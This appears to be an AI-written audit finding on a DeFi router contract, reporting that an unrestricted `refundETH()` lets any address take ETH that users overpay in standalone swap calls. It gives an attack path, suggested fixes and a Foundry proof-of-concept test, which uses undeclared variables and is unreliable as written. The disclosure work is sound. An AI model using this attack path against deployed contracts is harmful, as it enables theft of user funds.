The vulnerability is confirmed. Here is the full analysis:

### Title
Unprivileged `refundETH()` drains any ETH stranded on the router by a prior payable swap call — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`refundETH()` is an unrestricted `external payable` function that transfers the router's **entire** native ETH balance to `msg.sender`. Because every swap entry-point (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`) is also `payable` and the `pay()` helper only consumes exactly `amountIn` worth of native ETH (depositing it into WETH), any `msg.value` in excess of `amountIn` is silently left on the router. A subsequent call to `refundETH()` by any address — including an attacker — drains that residual balance.

### Finding Description

`refundETH()` contains no caller check:

```solidity
// PeripheryPayments.sol L58-63
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // ← no msg.sender restriction
    }
}
``` [1](#0-0) 

The `pay()` helper, when `token == WETH`, deposits only the exact `value` (= `amountIn`) into WETH and leaves any surplus native ETH untouched:

```solidity
// PeripheryPayments.sol L73-77
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();   // deposits amountIn only
        IERC20(WETH).safeTransfer(recipient, value);
    }
``` [2](#0-1) 

`exactInputSingle` (and all other swap entry-points) is `payable` and accepts arbitrary `msg.value`: [3](#0-2) 

The `receive()` guard (`if (msg.sender != WETH) revert NotWETH()`) only applies to plain ETH transfers — it does **not** block ETH arriving via a `payable` function call. [4](#0-3) 

**Attack path (two separate transactions):**

1. Victim calls `exactInputSingle{value: V}(...)` where `V > amountIn` and `tokenIn == WETH`. `pay()` deposits `amountIn` into WETH; `V - amountIn` remains as ETH on the router.
2. Attacker (watching the mempool or simply polling) calls `refundETH()`. The function reads `address(this).balance` (which now includes the victim's excess), and calls `_transferETH(msg.sender, balance)`, sending the full balance to the attacker.

The intended safe usage pattern — bundling `[exactInputSingle, refundETH]` inside a single `multicall` — is shown in the test suite: [5](#0-4) 

But `exactInputSingle` is also callable standalone (as shown in multiple other tests), and nothing in the contract enforces that callers use `multicall`. Any standalone payable swap call with excess `msg.value` leaves ETH permanently exposed.

### Impact Explanation
Direct theft of user ETH. Any excess native ETH sent with a WETH swap call is immediately claimable by any address via `refundETH()`. There is no minimum amount — the attacker receives the full stranded balance. This is a **High** severity direct loss of user principal.

### Likelihood Explanation
- `exactInputSingle` and all other swap functions are `external payable` and callable directly without `multicall`.
- Users sending slightly more ETH than needed (a common pattern to avoid reverts from price movement) are permanently at risk.
- The attack requires no special privileges, no malicious pool, and no non-standard token behavior — just a standalone payable swap call followed by a `refundETH()` call from any address.
- MEV bots can front-run or back-run the victim's transaction atomically.

### Recommendation
Restrict `refundETH()` to only refund ETH that was sent in the **same transaction** by the caller. The standard fix is to track the original `msg.sender` in transient storage (EIP-1153) or, more simply, to only allow `refundETH()` to be called via `multicall` (where `msg.sender` is preserved via `delegatecall`). Alternatively, record the depositor address when ETH enters the router and enforce that only that address can call `refundETH()`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import "forge-std/Test.sol";
import {MetricOmmSimpleRouter} from "metric-periphery/contracts/MetricOmmSimpleRouter.sol";
import {IMetricOmmSimpleRouter} from "metric-periphery/contracts/interfaces/IMetricOmmSimpleRouter.sol";

contract RefundETHTheftTest is Test {
    MetricOmmSimpleRouter router;
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // deploy router with real WETH + factory (use existing test fixtures)
        // fund victim with 2 ether
        vm.deal(victim, 2 ether);
    }

    function test_attackerStealsVictimExcessETH() public {
        uint128 amountIn = 1_000;
        uint256 excessValue = 1 ether; // victim sends far more than amountIn

        // Step 1: victim calls exactInputSingle directly (not via multicall)
        // with msg.value >> amountIn; excess ETH stays on router
        vm.prank(victim);
        router.exactInputSingle{value: excessValue}(
            IMetricOmmSimpleRouter.ExactInputSingleParams({
                pool: address(pool),
                tokenIn: address(weth),
                tokenOut: address(token1),
                zeroForOne: true,
                amountIn: amountIn,
                amountOutMinimum: 0,
                recipient: victim,
                deadline: block.timestamp + 100,
                priceLimitX64: 0,
                extensionData: ""
            })
        );

        // router now holds excessValue - amountIn of ETH
        assertGt(address(router).balance, 0, "router holds residual ETH");

        // Step 2: attacker calls refundETH() and receives victim's ETH
        uint256 attackerBefore = attacker.balance;
        vm.prank(attacker);
        router.refundETH();

        assertGt(attacker.balance, attackerBefore, "attacker stole victim ETH");
        assertEq(address(router).balance, 0, "router drained");
    }
}
```
